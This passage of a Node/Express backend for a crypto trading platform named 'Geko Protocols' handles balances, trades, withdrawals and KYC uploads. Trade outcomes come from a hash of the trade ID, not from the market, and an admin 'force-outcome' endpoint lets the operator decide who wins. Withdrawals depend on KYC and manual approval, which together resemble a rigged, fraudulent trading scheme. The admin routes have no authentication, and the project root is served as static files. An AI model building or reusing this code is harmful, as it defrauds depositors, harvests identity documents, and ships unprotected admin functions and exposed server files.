  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const transactions = db.data.transactions
      .filter(tx => tx.wallet_address === address)
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
      .slice(0, parseInt(limit || '50'));
    res.json({ success: true, transactions });
  } catch (e) {
    console.error('Fetch transactions error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/user/balance', async (req, res) => {
  const { address, asset } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const user = db.data.users.find(u => u.wallet_address === address) || { 
        trading_balance: 0, 
        protocol_settlement_balance: 0, 
        demo_balance: 100000, 
        status: 'guest', 
        kyc_status: 'none' 
    };

    if (asset === 'USDT') {
      return res.json({ 
        wallet_address: address, 
        asset: 'USDT', 
        status: user.status,
        kyc_status: user.kyc_status,
        balance: parseFloat(user.protocol_settlement_balance || 0),
        trading_balance: parseFloat(user.trading_balance || 0),
        demo_balance: parseFloat(user.demo_balance || 100000)
      });
    }

    // Group transactions by asset symbol
    const assetBalances = {};
    db.data.transactions
      .filter(tx => tx.wallet_address === address && tx.status === 'completed' && tx.type !== 'trade')
      .forEach(tx => {
          assetBalances[tx.asset_symbol] = (assetBalances[tx.asset_symbol] || 0) + parseFloat(tx.amount || 0);
      });

    const balances = Object.entries(assetBalances).map(([sym, bal]) => ({ asset: sym, balance: bal }));

    // Ensure USDT reflects protocol_settlement_balance
    const usdtIdx = balances.findIndex(b => b.asset === 'USDT');
    if (usdtIdx >= 0) balances[usdtIdx].balance = parseFloat(user.protocol_settlement_balance || 0);
    else balances.push({ asset: 'USDT', balance: parseFloat(user.protocol_settlement_balance || 0) });

    return res.json({ 
        wallet_address: address, 
        balances, 
        status: user.status, 
        kyc_status: user.kyc_status, 
        trading_balance: user.trading_balance, 
        demo_balance: user.demo_balance 
    });
  } catch (e) {
    console.error('Balance query error:', e.message);
    return res.status(500).json({ error: 'Balance query failed' });
  }
});

// ─── Trade endpoints ───────────────────────────────────────────────────────
app.get('/api/user/active-trades', async (req, res) => {
  const { address } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const trades = db.data.trades
      .filter(t => t.wallet_address === address && t.status === 'pending')
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    res.json(trades);
  } catch (e) {
    console.error('Fetch active trades error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/execute-trade', async (req, res) => {
  const { walletAddress, asset, tradeSize, leverage, type, isDemo, entryPrice, duration, tradeId } = req.body;
  if (!walletAddress || !tradeSize) return res.status(400).json({ error: 'Missing parameters' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const amt = Math.abs(parseFloat(tradeSize));
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';
    const balance = parseFloat(user[balanceField] || 0);
    if (balance < amt) return res.status(400).json({ error: 'Insufficient balance' });

    // Deduct balance
    user[balanceField] = (balance - amt).toString();

    // Insert trade record
    db.data.trades.push({
      id: tradeId || Math.random().toString(36).substring(7),
      wallet_address: walletAddress,
      symbol: asset,
      direction: type,
      amount: amt,
      entry_price: entryPrice,
      leverage: leverage || 10,
      duration,
      is_demo: isDemo || false,
      status: 'pending',
      created_at: new Date().toISOString()
    });

    // Record transaction
    await recordTransaction({
      wallet_address: walletAddress,
      asset_symbol: 'USDT',
      amount: -amt,
      type: 'trade',
      reference: `trade-open:${tradeId}`
    });

    await db.write();
    res.json({ success: true, message: 'Trade executed' });
  } catch (e) {
    console.error('Execute trade error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/settle-trade', async (req, res) => {
  const { walletAddress, asset, payout, tradeRef, isDemo, status: clientStatus } = req.body;
  if (!walletAddress || payout === undefined) return res.status(400).json({ error: 'Missing parameters' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const trade = db.data.trades.find(t => t.id === tradeRef && t.wallet_address === walletAddress);
    if (!trade) return res.status(404).json({ error: 'Trade not found' });
    
    if (trade.status !== 'pending') return res.status(400).json({ error: 'Trade already settled' });

    let isWin = false;
    if (trade.force_outcome === 'win') isWin = true;
    else if (trade.force_outcome === 'loss') isWin = false;
    else {
      const seed = trade.id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
      isWin = seed % 2 === 0;
    }

    const finalStatus = isWin ? 'won' : 'lost';
    const leverageFactor = (parseFloat(trade.leverage) || 10) / 10;
    const payoutRate = 0.85;
    const finalPayout = isWin ? parseFloat(trade.amount) * (1 + (payoutRate * leverageFactor)) : 0;
    
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    const balanceField = isDemo ? 'demo_balance' : 'trading_balance';

    // Update trade record
    trade.status = finalStatus;
    trade.settled_at = new Date().toISOString();

    // Credit balance if payout > 0
    if (finalPayout > 0 && user) {
      user[balanceField] = (parseFloat(user[balanceField] || 0) + finalPayout).toString();
      
      // Record transaction
      await recordTransaction({
        wallet_address: walletAddress,
        asset_symbol: 'USDT',
        amount: finalPayout,
        type: 'trade',
        reference: `trade-settle:${tradeRef}`
      });
    }

    await db.write();
    res.json({ success: true, message: `Trade settled as ${finalStatus}`, status: finalStatus, payout: finalPayout });
  } catch (e) {
    console.error('Settle trade error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Withdrawal endpoints ──────────────────────────────────────────────────
app.post('/api/request-withdrawal', async (req, res) => {
  const { walletAddress, destinationAddress, amount, asset } = req.body;
  if (!walletAddress || !destinationAddress || !amount || !asset)
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (user && user.kyc_status !== 'approved') {
        return res.status(403).json({ success: false, error: 'KYC verification required for withdrawals.' });
    }

    const balance = await getUserBalance(walletAddress, asset);
    if (balance < parseFloat(amount))
      return res.status(400).json({ success: false, error: `Insufficient balance. Available: ${balance} ${asset}` });

    const newRequest = {
        id: Date.now(),
        wallet_address: walletAddress,
        destination_address: destinationAddress.trim(),
        amount: parseFloat(amount),
        asset,
        status: 'pending',
        created_at: new Date().toISOString()
    };
    db.data.withdrawal_requests.push(newRequest);
    await db.write();

    return res.json({ success: true, requestId: newRequest.id });
  } catch (e) {
    console.error('Withdrawal request error:', e.message);
    return res.status(500).json({ success: false, error: e.message });
  }
});

// ─── Admin Trade endpoints ─────────────────────────────────────────────────
app.get('/api/admin/active-trades', async (req, res) => {
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const trades = db.data.trades
      .filter(t => t.status === 'pending')
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    res.json(trades);
  } catch (e) {
    console.error('Admin active trades error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/force-outcome', async (req, res) => {
  const { tradeId, forceOutcome } = req.body;
  if (!tradeId || !forceOutcome) return res.status(400).json({ error: 'tradeId and forceOutcome required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const trade = db.data.trades.find(t => t.id === tradeId);
    if (trade) {
      trade.force_outcome = forceOutcome;
      await db.write();
    }
    res.json({ success: true });
  } catch (e) {
    console.error('Force outcome error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Admin Withdrawal endpoints ───────────────────────────────────────────
app.get('/api/admin/withdrawal-requests', async (req, res) => {
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const enriched = await Promise.all(db.data.withdrawal_requests.map(async (wr) => {
        const user = db.data.users.find(u => u.wallet_address === wr.wallet_address);
        const current_balance = await getUserBalance(wr.wallet_address, wr.asset);
        return { ...wr, nickname: user?.nickname, current_balance };
    }));

    return res.json(enriched.sort((a, b) => new Date(b.created_at) - new Date(a.created_at)).slice(0, 200));
  } catch (e) {
    console.error('Admin withdrawal-requests error:', e.message);
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/approve-withdrawal', async (req, res) => {
  const { requestId } = req.body;
  if (!requestId) return res.status(400).json({ success: false, error: 'requestId required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const wr = db.data.withdrawal_requests.find(r => r.id == requestId);
    if (!wr) return res.status(404).json({ success: false, error: 'Request not found' });
    if (wr.status !== 'pending') return res.status(400).json({ success: false, error: 'Request not pending' });

    const balance = await getUserBalance(wr.wallet_address, wr.asset);
    if (balance < parseFloat(wr.amount)) return res.status(400).json({ success: false, error: 'Insufficient user balance' });

    // 1. Mark as approved
    wr.status = 'approved';
    wr.processed_at = new Date().toISOString();

    // 2. Debit balance
    if (wr.asset === 'USDT') {
        const user = db.data.users.find(u => u.wallet_address === wr.wallet_address);
        if (user) {
            user.protocol_settlement_balance = (parseFloat(user.protocol_settlement_balance || 0) - wr.amount).toString();
        }
    }
    
    await recordTransaction({
      wallet_address: wr.wallet_address,
      asset_symbol: wr.asset,
      amount: -parseFloat(wr.amount),
      type: 'withdrawal',
      reference: `withdrawal-approved:${requestId}`
    });

    await db.write();
    return res.json({ success: true });
  } catch (e) {
    console.error('Approve withdrawal error:', e.message);
    return res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/admin/reject-withdrawal', async (req, res) => {
  const { requestId, note } = req.body;
  if (!requestId) return res.status(400).json({ success: false, error: 'requestId required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const wr = db.data.withdrawal_requests.find(r => r.id == requestId);
    if (wr) {
      wr.status = 'rejected';
      wr.admin_note = note;
      wr.processed_at = new Date().toISOString();
      await db.write();
    }
    return res.json({ success: true });
  } catch (e) {
    console.error('Reject withdrawal error:', e.message);
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/kyc/submit', async (req, res) => {
  const { walletAddress, country, idFront, idBack } = req.body;
  if (!walletAddress || !country || !idFront) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    db.data.kyc_submissions.push({
        id: Date.now(),
        wallet_address: walletAddress,
        country,
        id_front: idFront,
        id_back: idBack || null,
        status: 'pending',
        created_at: new Date().toISOString()
    });
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (user) {
        user.kyc_status = 'pending';
    }
    await db.write();
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/admin/kyc/submissions', async (req, res) => {
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const submissions = db.data.kyc_submissions
      .filter(s => s.status === 'pending')
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    res.json(submissions);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/kyc/approve', async (req, res) => {
  const { submissionId, walletAddress } = req.body;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const sub = db.data.kyc_submissions.find(s => s.id == submissionId);
    if (sub) {
      sub.status = 'approved';
    }
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (user) {
      user.kyc_status = 'approved';
    }
    await db.write();
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Static files & SPA ───────────────────────────────────────────────────
const distPath = path.resolve(__dirname, 'dist');
const publicPath = path.resolve(__dirname, 'public');
const rootPath = __dirname;

app.use(express.static(distPath));
app.use(express.static(publicPath));
app.use(express.static(rootPath));

app.get('*', (req, res) => {
  if (req.url.startsWith('/api/')) return res.status(404).json({ error: 'API route not found on server' });
  
  // SECURE PRODUCTION ROUTING: Always try dist first for compiled assets
  const indexPath = path.join(distPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    return res.sendFile(indexPath);
  }
  
  // Fallback for development environments
  const rootIndexPath = path.join(rootPath, 'index.html');
  if (fs.existsSync(rootIndexPath)) {
    return res.sendFile(rootIndexPath);
  }
  
  res.status(404).send("<h1>Frontend Build Not Found</h1><p>Please run <code>npm run build</code> to generate production assets.</p>");
});

// ─── Global Error Handler ──────────────────────────────────────────────────
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err);
  res.status(err.status || 500).json({
    error: err.message || 'Internal Server Error',
    success: false
  });
});

const startServer = () => {
  app.listen(port, '0.0.0.0', () => {
    console.log(`🚀 Geko Protocols Server: http://0.0.0.0:${port}`);
    console.log(`🗄️  Database Status: ${dbAvailable ? 'CONNECTED ✅' : 'DISCONNECTED ❌'}`);
  });
};

if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
  startServer();
}

export default app;
